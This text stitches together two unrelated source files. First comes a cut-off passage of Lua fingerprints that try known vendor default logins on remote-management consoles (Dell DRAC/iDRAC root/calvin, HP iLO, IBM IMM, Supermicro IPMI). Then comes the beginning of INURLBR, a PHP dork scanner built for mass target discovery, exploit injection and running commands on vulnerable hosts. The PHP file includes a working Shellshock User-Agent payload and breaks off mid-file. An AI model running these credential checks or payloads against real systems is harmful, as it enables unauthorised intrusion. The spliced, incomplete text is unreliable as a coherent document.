    if response.header["server"] ~= "Bomgar" then return false end
    local resp = http_get_simple(host, port,
                                url.absolute(path, "appliance/"))
    return resp.status == 302
           and get_cookie(resp, "gw_s", "^%w+$")
           and (resp.header["location"] or ""):find("/appliance/login%.ns$")
  end,
  login_combos = {
    {username = "admin", password = "password"}
  },
  login_check = function (host, port, path, user, pass)
    local lurl = url.absolute(path, "appliance/login.ns")
    local resp1 = http_get_simple(host, port, lurl)
    if not (resp1.status == 200 and resp1.body) then return false end
    local formid = get_tag(resp1.body, "input", {type="^hidden$", name="^form_id$", value="^[%w+/]+=*$"})
    if not formid then return false end
    local form2 = {fake_password="",
                   form_id=formid.value,
                   ["login[username]"]=user,
                   ["login[password]"]=pass,
                   ["login[submit]"]="Login",
                   submit_button="Login"}
    local header = {["Referer"]=url.build(url_build_defaults(host, port, {path=lurl}))}
    local resp2 = http_post_simple(host, port, lurl,
                                  {cookies=resp1.cookies, header=header}, form2)
    return resp2.status == 200
           and get_tag(resp2.body or "", "input", {id="^new_password2$"})
  end
})

table.insert(fingerprints, {
  name = "Dell ERA",
  category = "console",
  paths = {
    {path = "/applet.html"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.header["server"] == "RMC Webserver 2.0"
           and response.body
           and response.body:find("DRSCAppletInterface.class", 1, true)
  end,
  login_combos = {
    {username = "root", password = "calvin"}
  },
  login_check = function (host, port, path, user, pass)
    local resp1 = http_get_simple(host, port, url.absolute(path, "cgi/challenge"))
    if resp1.status ~= 200 then return false end
    local url2 = ("cgi/login?user=%s&hash=%s"):format(user, pass)
    local resp2 = http_get_simple(host, port, url.absolute(path, url2),
                                 {cookies=resp1.cookies})
    return resp2.status == 200
           and (resp2.body or ""):find("<RMCLOGIN><RC>0x0</RC></RMCLOGIN>", 1, true)
  end
})

table.insert(fingerprints, {
  name = "Dell DRAC4",
  cpe = "cpe:/h:dell:remote_access_card",
  category = "console",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.header["server"] == "RMC Webserver 2.0"
           and response.body
           and response.body:find("DRAC 4", 1, true)
           and response.body:find("%Wvar%s+s_oemProductName%s*=%s*(['\"])DRAC 4%1")
  end,
  login_combos = {
    {username = "root", password = "calvin"}
  },
  login_check = function (host, port, path, user, pass)
    local resp = http_post_simple(host, port, url.absolute(path, "cgi/login"),
                                 nil, {user=user, hash=pass})
    return resp.status == 200
           and (resp.body or ""):find("%Wtop%.location%.replace%(%s*(['\"])[^'\"]-/cgi/main%1%s*%)")
  end
})

table.insert(fingerprints, {
  name = "Dell DRAC5",
  cpe = "cpe:/h:dell:remote_access_card",
  category = "console",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("%Wtop%.document%.location%.replace%(%s*(['\"])[^'\"]-/cgi%-bin/webcgi/index%1%s*%)")
           and response.body:lower():find("<title>remote access controller</title>", 1, true)
  end,
  login_combos = {
    {username = "root", password = "calvin"}
  },
  login_check = function (host, port, path, user, pass)
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "cgi-bin/webcgi/login"),
                                 nil, {user=user, password=pass})
    return resp.status == 302
           and (resp.header["location"] or ""):find("/cgi%-bin/webcgi/main$")
  end
})

table.insert(fingerprints, {
  name = "Dell iDRAC6 (lighttpd)",
  cpe = "cpe:/o:dell:idrac6_firmware",
  category = "console",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 302
           and (response.header["server"] or ""):find("^lighttpd/%d+%.")
           and (response.header["location"] or ""):find("/Applications/dellUI/login%.htm$")
  end,
  login_combos = {
    {username = "root", password = "calvin"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {WEBVAR_PASSWORD=pass,
                  WEBVAR_USERNAME=user,
                  WEBVAR_ISCMCLOGIN=0}
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "Applications/dellUI/RPC/WEBSES/create.asp"),
                                 nil, form)
    return resp.status == 200
           and (resp.body or ""):match("'USERNAME'%s*:%s*'(.-)'") == user
  end
})

table.insert(fingerprints, {
  name = "Dell iDRAC6/7 (Mbedthis)",
  cpe = "cpe:/o:dell:idrac7_firmware",
  category = "console",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    local idrac6 = response.status == 301
                   and (response.header["server"] or ""):find("^Mbedthis%-Appweb/%d+%.")
    local idrac7 = response.status == 302
                   and response.header["server"] == "Embedthis-http"
    return (idrac6 or idrac7)
           and (response.header["location"] or ""):find("/start%.html$")
  end,
  login_combos = {
    {username = "root", password = "calvin"}
  },
  login_check = function (host, port, path, user, pass)
    local resp = http_post_simple(host, port, url.absolute(path, "data/login"),
                                 nil, {user=user, password=pass})
    return resp.status == 200
           and (resp.body or ""):find("<authResult>0</authResult>", 1, true)
  end
})

table.insert(fingerprints, {
  name = "HP 9000 iLO",
  cpe = "cpe:/h:hp:integrated_lights-out",
  category = "console",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("HP 9000", 1, true)
           and response.body:find("loginId", 1, true)
           and response.body:lower():find("<title>hp ilo login</title>", 1, true)
  end,
  login_combos = {
    {username = "Admin", password = "Admin"},
    {username = "Oper",  password = "Oper"}
  },
  login_check = function (host, port, path, user, pass)
    local resp = http_post_simple(host, port, url.absolute(path, "signin.html"),
                                 nil, {loginId=user, password=pass})
    return resp.status == 200
           and get_refresh_url(resp.body or "", "/home%.html$")
           and get_cookie(resp, "MPID", "^%x+$")
  end
})

table.insert(fingerprints, {
  name = "IBM Integrated Management Module",
  cpe = "cpe:/o:ibm:integrated_management_module_firmware",
  category = "console",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 301
           and (response.header["location"] or ""):find("/designs/imm/index%.php$")
  end,
  login_combos = {
    {username = "USERID", password = "PASSW0RD"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {user=user,
                  password=pass,
                  SessionTimeout=1200}
    local resp = http_post_simple(host, port, url.absolute(path, "data/login"),
                                 nil, form)
    if not (resp.status == 200 and resp.body) then return false end
    local jstatus, jout = json.parse(resp.body)
    return jstatus and jout.authResult == "0"
  end
})

table.insert(fingerprints, {
  name = "Supermicro IPMI",
  cpe = "cpe:/o:supermicro:intelligent_platform_management_firmware",
  category = "console",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("ATEN International", 1, true)
           and response.body:find("/cgi/login.cgi", 1, true)
  end,
  login_combos = {
    {username = "ADMIN", password = "ADMIN"}
  },
  login_check = function (host, port, path, user, pass)
    local resp = http_post_simple(host, port, url.absolute(path, "cgi/login.cgi"),
                                 nil, {name=user, pwd=pass})
    return resp.status == 200
           and (resp.body or ""):find("../cgi/url_redirect.cgi?url_name=mainmenu", 1, true)
  end
})

#!/usr/bin/php -q
<?php
/*

  +-----------------------------------------------------------------------------+
  |  [!] Legal disclaimer: Usage of INURLBR for attacking targets without prior |
  |  mutual consent is illegal.                                                 |
  |  It is the end user's responsibility to obey all applicable local, state and|
  |  federal laws.                                                              |
  |  Developers assume no liability and are not responsible for any misuse or   |
  |  damage caused by this program                                              |
  +-----------------------------------------------------------------------------+


  [+] AUTOR:        Cleiton Pinheiro / Nick: googleINURL
  [+] Blog:         http://blog.inurl.com.br
  [+] Twitter:      https://twitter.com/googleinurl
  [+] Fanpage:      https://fb.com/InurlBrasil
  [+] Pastebin      http://pastebin.com/u/Googleinurl
  [+] GIT:          https://github.com/googleinurl
  [+] PSS:          http://packetstormsecurity.com/user/googleinurl
  [+] EXA:          http://exploit4arab.net/author/248/Cleiton_Pinheiro
  [+] YOUTUBE:      http://youtube.com/c/INURLBrasil
  [+] PLUS:         http://google.com/+INURLBrasil

  [+] SCRIPT NAME: INURLBR 2.1
  INURLBR scanner was developed by Cleiton Pinheiro, owner and founder of INURL - BRASIL.
  Tool made ​​in PHP that can run on different Linux distributions helps
  hackers / security professionals in their specific searches.
  With several options are automated methods of exploration, AND SCANNER is
  known for its ease of use and performasse.
  The inspiration to create the inurlbr scanner, was the XROOT Scan 5.2 application.

  [+]  Long desription
  The INURLBR tool was developed aiming to meet the need of Hacking community.
  Purpose: Make advanced searches to find potential vulnerabilities in web
  applications known as Google Hacking with various options and search filters,
  this tool has an absurd power of search engines available with
  (24) + 6 engines special(deep web)

  - Possibility generate IP ranges or random_ip and analyze their targets.
  - Customization of  HTTP-HEADER, USER-AGET, URL-REFERENCE.
  - Execution external to exploit certain targets.
  - Generator dorks random or set file dork.
  - Option to set proxy, file proxy list, http proxy, file http proxy.
  - Set time random proxy.
  - It is possible to use TOR ip Random.
  - Debug processes urls, http request, process irc.
  - Server communication irc sending vulns urls for chat room.
  - Possibility injection exploit GET / POST => SQLI, LFI, LFD.
  - Filter and validation based regular expression.
  - Extraction of email and url.
  - Validation using http-code.
  - Search pages based on strings file.
  - Exploits commands manager.
  - Paging limiter on search engines.
  - Beep sound when trigger vulnerability note.
  - Use text file as a data source for urls tests.
  - Find personalized strings in return values of the tests.
  - Validation vulnerability shellshock.
  - File validation values wordpress wp-config.php.
  - Execution sub validation processes.
  - Validation syntax errors database and programmin.
  - Data encryption as native parameter.
  - Random google host.
  - Scan port.
  - Error Checking & values​​:
  [*]JAVA INFINITYDB, [*]LOCAL FILE INCLUSION, [*]ZIMBRA MAIL,           [*]ZEND FRAMEWORK,
  [*]ERROR MARIADB,   [*]ERROR MYSQL,          [*]ERROR JBOSSWEB,        [*]ERROR MICROSOFT,
  [*]ERROR ODBC,      [*]ERROR POSTGRESQL,     [*]ERROR JAVA INFINITYDB, [*]ERROR PHP,
  [*]CMS WORDPRESS,   [*]SHELL WEB,            [*]ERROR JDBC,            [*]ERROR ASP,
  [*]ERROR ORACLE,    [*]ERROR DB2,            [*]JDBC CFM,              [*]ERROS LUA,
  [*]ERROR INDEFINITE

  [+] Dependencies - (PHP 5.4.*):
  sudo apt-get install curl libcurl3 libcurl3-dev php5 php5-cli php5-curl


  [+] Play LIST TUTORIAL:
  https://www.youtube.com/watch?v=jwjZUsgf9xM&list=PLV1376pVwcCmcoCmq_Z4O0ra4BqjmhIaR


  +--------------------------------------------------------------------------------------+
  |  |  |                            G R 3 3 T S                                   |  |  |
  +--------------------------------------------------------------------------------------+
 * r00t-3xp10t, Jh00n, chk_,  Unknownantisec,  sl4y3r 0wn3r, hc0d3r, arplhmd, 0x4h4x
 * Clandestine, KoubackTr, SnakeTomahawk, SkyRedFild, Lorenzo Faletra, Eclipse, shaxer   
 * dd3str0y3r, Johnny Deep, Lenon Leite, pSico_b0y, Bakunim_Malvadão, IceKiller, c00z  
 * Oystex, rH, Warflop, se4b3ar 

 */

error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '256M');
ini_set('display_errors', 0);
ini_set('max_execution_time', 0);
ini_set('allow_url_fopen', 1);
(!isset($_SESSION) ? session_start() : NULL);
__OS();


/*
  [+]Capturing TERMINAL VALUES.
  (PHP 4 >= 4.3.0, PHP 5)getopt - Gets options from the command line argument list
  http://php.net/manual/pt_BR/function.getopt.php */
$commandos_list = array(
    'dork:', 'dork-file:', 'exploit-cad:', 'range:', 'range-rand:', 'irc:',
    'exploit-all-id:', 'exploit-vul-id:', 'exploit-get:', 'exploit-post:',
    'regexp-filter:', 'exploit-command:', 'command-all:', 'command-vul:',
    'replace:', 'remove:', 'regexp:', 'sall:', 'sub-file:', 'sub-get::', 'sub-concat:',
    'user-agent:', 'url-reference:', 'delay:', 'sendmail:', 'time-out:',
    'http-header:', 'ifcode:', 'ifurl:', 'ifemail:', 'mp:', 'target:',
    'no-banner::', 'gc::', 'proxy:', 'proxy-file:', 'time-proxy:', 'pr::',
    'proxy-http-file:', 'update::', 'info::', 'help::', 'unique::', 'popup::',
    'ajuda::', 'install-dependence::', 'cms-check::', 'sub-post::', 'robots::',
    'alexa-rank::', 'beep::', 'exploit-list::', 'tor-random::', 'shellshock::',
    'dork-rand:', 'sub-cmd-all:', 'sub-cmd-vul:', 'port-cmd:', 'port-scan:',
    'port-write:', 'ifredirect:', 'persist:', 'file-cookie:', 'save-as:'
);

$opcoes = getopt('u::a:d:o:p:s:q:t:m::h::', $commandos_list);


/*
  [+]VERIFYING LIB php5-curl IS INSTALLED.
  (PHP 4, PHP 5) function_exists — Return TRUE if the given function has been
  defined.
  http://php.net/manual/en/function.function-exists.php

  [+]Verification - CURL_EXEC
  Execute the given cURL session.
  This function should be called after initializing a cURL session and all the
  options for the session are set.
  http://php.net/manual/en/function.curl-exec.php */
(!function_exists('curl_exec') ? __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c2"]} INSTALLING THE LIBRARY php5-curl ex: php5-curl apt-get install{$_SESSION["c0"]}\n") : NULL );

/*
  [+]VERIFYING use Input PHP CLI.
  (PHP 4, PHP 5) defined — Checks whether a given named constant exists
  http://php.net/manual/pt_BR/function.defined.php */
(!defined('STDIN') ? __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c2"]} Please run it through command-line!{$_SESSION["c0"]}\n") : NULL);


#[+]Resetting VALUES $ _SESSION ['config']
$_SESSION['config'] = array();
$_SESSION['config']['version_script'] = '2.1';
$_SESSION['config']['totas_urls'] = NULL;
$_SESSION['config']["contUrl"] = 0;
$_SESSION['config']['cont_email'] = 0;
$_SESSION['config']['cont_url'] = 0;
$_SESSION['config']['cont_valores'] = 0;

#[+] FILE MANAGEMENT EXPLOITS.
$_SESSION['config']['file_exploit_conf'] = 'exploits.conf';

#[+] FOLDER WHERE WILL BE SAVED PROCESSES.
$_SESSION['config']['out_put_paste'] = 'output/';

/*
  [+]USER-AGENT EXPLOIT SHELLSHOCK
  (CVE-2014-6271, CVE-2014-6277,
  CVE-2014-6278, CVE-2014-7169,
  CVE-2014-7186, CVE-2014-7187)
  is a vulnerability in GNU's bash shell that gives attackers access to run remote
  commands on a vulnerable system. */
$_SESSION['config']['user_agent_xpl'] = "() { foo;};echo; /bin/bash -c \"expr 299663299665 / 3; echo CMD:;id; echo END_CMD:;\"";

#[+]BLACK LIST URL-STRINGS
$_SESSION['config']['blacklist'] = "//t.co,google.,youtube.,jsuol.com,.radio.uol.,b.uol.,barra.uol.,whowhere.,hotbot.,amesville.,lycos,lygo.,orkut.,schema.,blogger.,bing.,w3.,yahoo.,yimg.,creativecommons.org,ndj6p3asftxboa7j.,.torproject.org,.lygo.com,.apache.org,.hostname.,document.,";
$_SESSION['config']['blacklist'].= "live.,microsoft.,ask.,shifen.com,answers.,analytics.,googleadservices.,sapo.pt,favicon.,blogspot.,wordpress.,.css,scripts.js,jquery-1.,dmoz.,gigablast.,aol.,.macromedia.com,.sitepoint.,yandex.,www.tor2web.org,.securityfocus.com,.Bootstrap.,.metasploit.com,";
$_SESSION['config']['blacklist'].= "aolcdn.,altavista.,clusty.,teoma.,baiducontent.com,wisenut.,a9.,uolhost.,w3schools.,msn.,baidu.,hao123.,shifen.,procog.,facebook.,twitter.,flickr.,.adobe.com,oficinadanet.,elephantjmjqepsw.,.shodan.io,kbhpodhnfxl3clb4,.scanalert.com,.prototype.,feedback.core,";
$_SESSION['config']['blacklist'].= "4shared.,.KeyCodeTab,.style.,www/cache/i1,.className.,=n.,a.Ke=,Y.config,.goodsearch.com,style.top,n.Img,n.canvas.,t.search,Y.Search.,a.href,a.currentStyle,a.style,yastatic.,.oth.net,.hotbot.com,.zhongsou.com,ezilon.com,.example.com,location.href,.navigation.,";
$_SESSION['config']['blacklist'].= ".bingj.com,Y.Mobile.,srpcache?p,stackoverflow.,shifen.,baidu.,baiducontent.,gstatic.,php.net,wikipedia.,webcache.,inurl.,naver.,navercorp.,windows.,window.,.devmedia,imasters.,.inspcloud.com,.lycos.com,.scorecardresearch.com,.target.,JQuery.min,Element.location.,";
$_SESSION['config']['blacklist'].= "exploit-db,packetstormsecurity.,1337day,owasp,.sun.com,mobile10.dtd,onabort=function,inurl.com.br,purl.org,.dartsearch.net,r.cb,.classList.,.pt_BR.,github,microsofttranslator.com,.compete.com,.sogou.com,gmail.,blackle.com,boorow.com,gravatar.com,sourceforge.,.mozilla.org";

$_SESSION['config']['line'] = "\n{$_SESSION["c1"]} _[ - ]{$_SESSION["c7"]}::{$_SESSION["c1"]}--------------------------------------------------------------------------------------------------------------{$_SESSION["c0"]}";

#[+]PRINTING HELP / INFO
(isset($opcoes['h']) || isset($opcoes['help']) || isset($opcoes['ajuda']) ? __menu() : NULL);
(isset($opcoes['info']) ? __info() : NULL);

#[+]PRINTING EXPLOITS LIST.
(isset($opcoes['exploit-list']) ? print(__bannerLogo()) . __configExploitsList(1)  : NULL);

#[+]CREATING DEFAULT SETTINGS EXIT RESULTS.
(!is_dir($_SESSION['config']['out_put_paste']) ? mkdir($_SESSION['config']['out_put_paste'], 0777, TRUE) : NULL);

#[+]CREATING DEFAULT SETTINGS MANAGEMENT EXPLOITS.
(!file_exists($_SESSION['config']['file_exploit_conf']) ? touch($_SESSION['config']['file_exploit_conf']) : NULL);

#[+]Deletes FILE cookie STANDARD.
(file_exists('cookie.txt') ? unlink('cookie.txt') : NULL);

#[+]REGISTRATION NEW COMMAND EXPLOIT
(not_isnull_empty($opcoes['exploit-cad']) ? __configExploitsADD($opcoes['exploit-cad']) : NULL);

#[+]Dependencies installation
(isset($opcoes['install-dependence']) ? __installDepencia() : NULL);

#[+]UPDATE SCRIPT
(isset($opcoes['update']) ? __update() : NULL);

################################################################################
#CAPTURE OPTIONS################################################################
################################################################################
#[+]VALIDATION SEARCH METHODS / (DORK,RANGE-IP)
if (not_isnull_empty($opcoes['o'])) {

    $_SESSION['config']['abrir-arquivo'] = $opcoes['o'];
} else if (!not_isnull_empty($opcoes['o']) &&
        !not_isnull_empty($opcoes['range']) &&
        !not_isnull_empty($opcoes['range-rand']) &&
        !not_isnull_empty($opcoes['dork-rand'])) {

    $_SESSION['config']['dork'] = not_isnull_empty($opcoes['dork']) && is_null($_SESSION['config']['abrir-arquivo']) ? $opcoes['dork'] : NULL;
    $_SESSION['config']['dork-file'] = not_isnull_empty($opcoes['dork-file']) && is_null($_SESSION['config']['abrir-arquivo']) ? $opcoes['dork-file'] : NULL;
    (!not_isnull_empty($_SESSION['config']['dork']) && !not_isnull_empty($_SESSION['config']['dork-file']) ? __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c2"]}DEFINE DORK ex: --dork '.asp?CategoryID=' OR --dork-file 'dorks.txt'{$_SESSION["c0"]}\n") : NULL);
}

#[+]VALIDATION GENERATE DORKS RANDOM
$_SESSION['config']['dork-rand'] = not_isnull_empty($opcoes['dork-rand']) ? $opcoes['dork-rand'] : NULL;

#[+]VALIDATION TARGET FIND PAGE
$_SESSION['config']['target'] = not_isnull_empty($opcoes['target']) && !isset($_SESSION['config']['dork']) ? $opcoes['target'] : NULL;

#[+]VALIDATION URL EXTRACTION
$_SESSION['config']['extrai-url'] = isset($opcoes['u']) ? TRUE : NULL;

#[+]VALIDATION EMAIL EXTRACTION
$_SESSION['config']['extrai-email'] = isset($opcoes['m']) ? TRUE : NULL;

#[+]VALIDATION ID SEARCH ENGINE
$_SESSION['config']['motor'] = not_isnull_empty($opcoes['q']) &&
        __validateOptions('1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,e1,e2,e3,e4,e5,e6,all', $opcoes['q']) ? $opcoes['q'] : 1;

#[+]VALIDATION SAVE FILE VULNERABLE
!not_isnull_empty($opcoes['s']) && !not_isnull_empty($opcoes['save-as']) && empty($opcoes['sall']) ?
                __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c2"]}DEFINE FILE SAVE OUTPUT ex: -s , --save-as , --sall filevull.txt{$_SESSION["c0"]}\n") : NULL;

$_SESSION['config']['s'] = not_isnull_empty($opcoes['s']) ? $opcoes['s'] : null;

$_SESSION['config']['save-as'] = not_isnull_empty($opcoes['save-as']) ? $opcoes['save-as'] : null;

$_SESSION['config']['arquivo_output'] = not_isnull_empty($_SESSION['config']['s']) ? $_SESSION['config']['s'] : $opcoes['save-as'];

#[+]VALIDATION SAVE FILE ALL VALORES
$_SESSION['config']['arquivo_output_all'] = not_isnull_empty($opcoes['sall']) ? $opcoes['sall'] : NULL;

#[+]VALIDATION TYPE ERROR
$_SESSION['config']['tipoerro'] = not_isnull_empty($opcoes['t']) && __validateOptions('1,2,3,4,5', $opcoes['t']) ? $opcoes['t'] : 1;

#[+]VALIDATION REPLACEMENT VALUES
$_SESSION['config']['replace'] = not_isnull_empty($opcoes['replace']) ? $opcoes['replace'] : NULL;

#[+]VALIDATION SET PROXY
$_SESSION['config']['proxy'] = not_isnull_empty($opcoes['proxy']) ? $opcoes['proxy'] : NULL;

#[+]VALIDATION SET FILE WITH LIST OF PROXY
$_SESSION['config']['proxy-file'] = not_isnull_empty($opcoes['proxy-file']) ? $opcoes['proxy-file'] : NULL;

#[+]VALIDATION SET HTTP->PROXY
$_SESSION['config']['proxy-http'] = not_isnull_empty($opcoes['proxy-http']) ? $opcoes['proxy-http'] : NULL;

#[+]VALIDATION SET FILE WITH LIST OF HTTP->PROXY
$_SESSION['config']['proxy-http-file'] = not_isnull_empty($opcoes['proxy-http-file']) ? $opcoes['proxy-http-file'] : NULL;

#[+]VALIDATION SET EXPLOIT VIA REQUEST GET
$_SESSION['config']['exploit-get'] = not_isnull_empty($opcoes['exploit-get']) ? str_replace(' ', '%20', $opcoes['exploit-get']) : NULL;

#[+]VALIDATION SET EXPLOIT VIA REQUEST POST
$_SESSION['config']['exploit-post'] = not_isnull_empty($opcoes['exploit-post']) ? __convertUrlQuery($opcoes['exploit-post']) : NULL;
$_SESSION['config']['exploit-post_str'] = not_isnull_empty($opcoes['exploit-post']) ? $opcoes['exploit-post'] : NULL;

#[+]VALIDATION COMMAND SHELL STRING COMPLEMENTARY
$_SESSION['config']['exploit-command'] = not_isnull_empty($opcoes['exploit-command']) ? $opcoes['exploit-command'] : NULL;

#[+]VALIDATION MANAGEMENT COMMANDS SHELL TARGET VULN ID
$_SESSION['config']['exploit-vul-id'] = not_isnull_empty($opcoes['exploit-vul-id']) ? $opcoes['exploit-vul-id'] : NULL;

#[+]VALIDATION MANAGEMENT COMMANDS SHELL ALL TARGET ID
$_SESSION['config']['exploit-all-id'] = not_isnull_empty($opcoes['exploit-all-id']) ? $opcoes['exploit-all-id'] : NULL;

#[+]VALIDATION SET COMMANDS SHELL EXECUTE TARGET VULN
$_SESSION['config']['command-vul'] = not_isnull_empty($opcoes['command-vul']) ? $opcoes['command-vul'] : NULL;

#[+]VALIDATION SET COMMANDS SHELL EXECUTE ALL TARGET
$_SESSION['config']['command-all'] = not_isnull_empty($opcoes['command-all']) ? $opcoes['command-all'] : NULL;

#[+]VALIDATION ADDITIONAL TYPE OF PARAMETER ERROR
$_SESSION['config']['achar'] = not_isnull_empty($opcoes['a']) ? $opcoes['a'] : NULL;

#[+]VALIDATION DEBUG NIVEL
$_SESSION['config']['debug'] = not_isnull_empty($opcoes['d']) && __validateOptions('1,2,3,4,5,6', $opcoes['d']) ? $opcoes['d'] : NULL;

#[+]VALIDATION INTERNAL
$_SESSION['config']['verifica_info'] = (__validateOptions($opcoes['d'], 6)) ? 1 : NULL;

#[+]VALIDATION ADDITIONAL PARAMETER PROXY
$_SESSION['config']['tor-random'] = isset($opcoes['tor-random']) && !is_null($_SESSION["config"]["proxy"]) ? TRUE : NULL;

#[+]VALIDATION CHECK VALUES CMS
$_SESSION['config']['cms-check'] = isset($opcoes['cms-check']) ? TRUE : NULL;

#[+]VALIDATION CHECK LINKS WEBCACHE GOOGLE
$_SESSION['config']['webcache'] = isset($opcoes['gc']) ? TRUE : NULL;

#[+]VALIDATION REGULAR EXPRESSION
$_SESSION['config']['regexp'] = not_isnull_empty($opcoes['regexp']) ? $opcoes['regexp'] : NULL;

#[+]VALIDATION FILTER BY REGULAR EXPRESSION
$_SESSION['config']['regexp-filter'] = not_isnull_empty($opcoes['regexp-filter']) ? $opcoes['regexp-filter'] : NULL;

#[+]VALIDATION NO BANNER SCRIPT
$_SESSION['config']['no-banner'] = isset($opcoes['no-banner']) ? TRUE : NULL;

#[+]VALIDATION SET USER-AGENT REQUEST
$_SESSION['config']['user-agent'] = not_isnull_empty($opcoes['user-agent']) ? $opcoes['user-agent'] : NULL;

#[+]VALIDATION SET URL-REFERENCE REQUEST
$_SESSION['config']['url-reference'] = not_isnull_empty($opcoes['url-reference']) ? $opcoes['url-reference'] : NULL;

#[+]VALIDATION PAGING THE MAXIMUM SEARCH ENGINE
$_SESSION['config']['max_pag'] = not_isnull_empty($opcoes['mp']) ? $opcoes['mp'] : NULL;

#[+]VALIDATION DELAY SET PAGING AND PROCESSES
$_SESSION['config']['delay'] = not_isnull_empty($opcoes['delay']) ? $opcoes['delay'] : NULL;

#[+]VALIDATION SET TIME OUT REQUEST
$_SESSION['config']['time-out'] = not_isnull_empty($opcoes['time-out']) ? $opcoes['time-out'] : NULL;

#[+]VALIDATION CODE HTTP
$_SESSION['config']['ifcode'] = not_isnull_empty($opcoes['ifcode']) ? $opcoes['ifcode'] : NULL;

#[+]VALIDATION STRING URL
$_SESSION['config']['ifurl'] = not_isnull_empty($opcoes['ifurl']) ? $opcoes['ifurl'] : NULL;

#[+]VALIDATION SET HTTP HEADER
$_SESSION['config']['http-header'] = not_isnull_empty($opcoes['http-header']) ? $opcoes['http-header'] : NULL;

#[+]VALIDATION SET FILE SUB_PROCESS
$_SESSION['config']['sub-file'] = not_isnull_empty($opcoes['sub-file']) ? __openFile($opcoes['sub-file'], 1) : NULL;

#[+]VALIDATION SUB_PROCESS TYPE REQUEST POST
$_SESSION['config']['sub-post'] = isset($opcoes['sub-post']) ? TRUE : NULL;

#[+]VALIDATION SUB_PROCESS TYPE REQUEST GET
$_SESSION['config']['sub-get'] = isset($opcoes['sub-get']) ? TRUE : NULL;

#[+]VALIDATION SEND VULN EMAIL
$_SESSION['config']['sendmail'] = not_isnull_empty($opcoes['sendmail']) ? $opcoes['sendmail'] : NULL;

#[+]VALIDATION SHOW RANK ALEXA
$_SESSION['config']['alexa-rank'] = isset($opcoes['alexa-rank']) ? TRUE : NULL;

#[+]VALIDATION ACTIVATE BEEP WHEN APPEAR VULNERABLE
$_SESSION['config']['beep'] = isset($opcoes['beep']) ? TRUE : NULL;

#[+]VALIDATION OF SINGLE DOMAIN FILTER 
$_SESSION['config']['unique'] = isset($opcoes['unique']) ? TRUE : NULL;

#[+]VALIDATION IRC SERVER/CHANNEL SEND VULN
$_SESSION['config']['irc']['conf'] = not_isnull_empty($opcoes['irc']) && strstr($opcoes['irc'], '#') ? explode("#", $opcoes['irc']) : NULL;

#[+]VALIDATION RANGE IP
$_SESSION['config']['range'] = not_isnull_empty($opcoes['range']) && strstr($opcoes['range'], ',') ? $opcoes['range'] : NULL;

#[+]VALIDATION QUANTITY RANGE IP RANDOM
$_SESSION['config']['range-rand'] = not_isnull_empty($opcoes['range-rand']) ? $opcoes['range-rand'] : NULL;

#[+]VALIDATION REMOVE STRING URL
$_SESSION['config']['remove'] = not_isnull_empty($opcoes['remove']) ? $opcoes['remove'] : NULL;

#[+]VALIDATION ACCESS FILE ROBOTS
$_SESSION['config']['robots'] = isset($opcoes['robots']) ? TRUE : NULL;

#[+]VALIDATION FILTER EMAIL STRING
$_SESSION['config']['ifemail'] = not_isnull_empty($opcoes['ifemail']) ? $opcoes['ifemail'] : NULL;

#[+]VALIDATION OPEN WINDOW CONSOLE PROCESS
$_SESSION['config']['popup'] = isset($opcoes['popup']) ? TRUE : NULL;

#[+]VALIDATION ACTIVATE SHELLSHOCK
$_SESSION['config']['shellshock'] = isset($opcoes['shellshock']) ? TRUE : NULL;

#[+]VALIDATION METHOD OF BUSTA PROGRESSIVE
$_SESSION['config']['pr'] = isset($opcoes['pr']) ? TRUE : NULL;

#[+]VALIDATION SET SUB-COMMANDS SHELL EXECUTE ALL TARGET
$_SESSION['config']['sub-cmd-all'] = isset($opcoes['sub-cmd-all']) ? TRUE : NULL;

#[+]VALIDATION SET SUB-COMMANDS SHELL EXECUTE TARGET VULN
$_SESSION['config']['sub-cmd-vul'] = isset($opcoes['sub-cmd-vul']) ? TRUE : NULL;

#[+]VALIDATION SET POR VALIDATION
$_SESSION['config']['port-cmd'] = not_isnull_empty($opcoes['port-cmd']) ? $opcoes['port-cmd'] : NULL;

#[+]VALIDATION SET SCAN PORT
$_SESSION['config']['port-scan'] = not_isnull_empty($opcoes['port-scan']) ? $opcoes['port-scan'] : NULL;

#[+]VALIDATION SET PAYLOAD XPL PORT
$_SESSION['config']['port-write'] = not_isnull_empty($opcoes['port-write']) ? $opcoes['port-write'] : NULL;

#[+]VALIDATION SET URL REDIRECT HEADER
$_SESSION['config']['ifredirect'] = not_isnull_empty($opcoes['ifredirect']) ? $opcoes['ifredirect'] : NULL;

#[+]VALIDATION SET URL REDIRECT HEADER
$_SESSION['config']['persist'] = not_isnull_empty($opcoes['persist']) ? $opcoes['persist'] : 4;

#[+]VALIDATION SET FILE COOKIE
$_SESSION['config']['file-cookie'] = not_isnull_empty($opcoes['file-cookie']) ? $opcoes['file-cookie'] : NULL;

#[+]VALIDATION SET STRING CONCAT URL SUB-PROCESS
$_SESSION['config']['sub-concat'] = not_isnull_empty($opcoes['sub-concat']) ? $opcoes['sub-concat'] : NULL;

################################################################################
#IRC CONFIGURATION##############################################################
################################################################################

if (is_array($_SESSION['config']['irc']['conf'])) {

    $alph = range("A", "Z");
